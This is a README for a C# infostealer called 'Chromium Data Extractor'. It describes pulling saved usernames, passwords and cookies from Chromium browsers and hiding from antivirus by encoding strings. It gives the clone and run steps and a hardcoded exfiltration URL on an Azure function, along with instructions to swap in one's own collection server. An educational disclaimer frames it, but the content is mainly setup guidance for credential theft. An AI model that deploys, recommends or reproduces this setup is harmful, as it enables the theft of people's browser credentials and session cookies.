# Chromium Data Extractor - For Educational and Ethical Use Only

## Disclaimer

This project is designed strictly for educational purposes and ethical security research. It is intended to demonstrate the potential vulnerabilities in Chromium-based browsers and how sensitive data can be at risk. **This tool should only be used in controlled environments, with explicit permission, and for educational or security research purposes.** Unauthorized access to or transmission of personal data is illegal and unethical.

## Youtube Demo
[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/qK3GkVzI35o/0.jpg)](https://www.youtube.com/watch?v=qK3GkVzI35o&ab_channel=MohammedHattab)

## Introduction

The Chromium Data Extractor is a proof-of-concept tool intended for cybersecurity educators and researchers. It simulates how an attacker might extract sensitive data from Chromium-based browsers, such as usernames, passwords, and cookies, and emphasizes the importance of understanding these vulnerabilities to enhance cybersecurity measures.

## Table of Contents

- [Disclaimer](#disclaimer)
- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Dependencies](#dependencies)
- [Configuration](#configuration)



## Features

- Extraction of usernames, passwords, and cookies from Chromium-based browsers.
- Demonstration of data consolidation into an Excel sheet for analysis.
- Use of API for controlled data transmission in a research environment.
- Techniques for avoiding AV detection through string encoding (for educational demonstration).

## Installation

Provide detailed instructions on setting up the environment and tools required to run this project safely and legally.

## Usage

Follow these steps to get started with the Chromium Data Extractor project:

**Clone the Repository**: First, clone this repository to your local machine using Git. Open your terminal or command prompt and run the following command:

   ```bash
   git clone https://github.com/The-Hustler-Hattab/Info_Stealer.git
   ```

After cloning the repository, follow these steps to set up and run the project:

### Open the Project

1. Open Visual Studio or your preferred IDE that supports C# and .NET 8 development.
2. Select `File` > `Open` > `Project/Solution` from the menu.
3. Navigate to the cloned project directory.
4. Open the solution file (.sln).

### Restore Dependencies

- In Visual Studio, dependencies can often be restored automatically.
- Alternatively, right-click on the solution in the Solution Explorer and select `Restore NuGet Packages` to manually restore any missing NuGet packages.

### Build the Project

- To compile the project and ensure everything is correctly set up, select `Build` > `Build Solution` in Visual Studio.

### Run the Project

- After successfully building the project, you can run it by pressing `F5` or clicking the `Start` button in Visual Studio.

### Important Reminder

This project is intended strictly for educational and ethical security research purposes. Users must adhere to all ethical guidelines and secure the necessary permissions for any testing or research activities involving this tool.



## Dependencies

- **.NET 8**: This project is developed using C# on the .NET 8 framework. Ensure you have the .NET 8 SDK installed on your system. You can download it from the [official .NET download page](https://dotnet.microsoft.com/download/dotnet/8.0).

To check if you have .NET 8 installed, you can run the following command in your terminal or command prompt:
```bash
dotnet --version
```
This should return a version number. If the version is 8.x, you are ready to proceed with the project setup.
## Configuration

The project requires setting up a specific server URI where the extracted data will be sent. Follow these steps to update the server URI in the project:

1. **Locate the Configuration File**: Open the project in your IDE and find the file that contains the `SERVER_HTTP_URI` constant. This will typically be in a configuration class or file within your project.

2. **Update the Server URI**:
    - Locate the following line of code in utils.Constants:
      ```csharp
      public const String SERVER_HTTP_URI = "https://file-exfiltration.azurewebsites.net/api/ExfiltrateFiles?code=08wvQkLYKEx6oMsNjHW15vs7zzRluhdvGg4s_FH34fInAzFuqs_svA==";
      ```
    - Replace the URL `"https://file-exfiltration.azurewebsites.net/api/ExfiltrateFiles?code=08wvQkLYKEx6oMsNjHW15vs7zzRluhdvGg4s_FH34fInAzFuqs_svA=="` with the URI of your server where you intend to receive the data. Ensure your server is configured to handle requests from this tool securely and ethically.
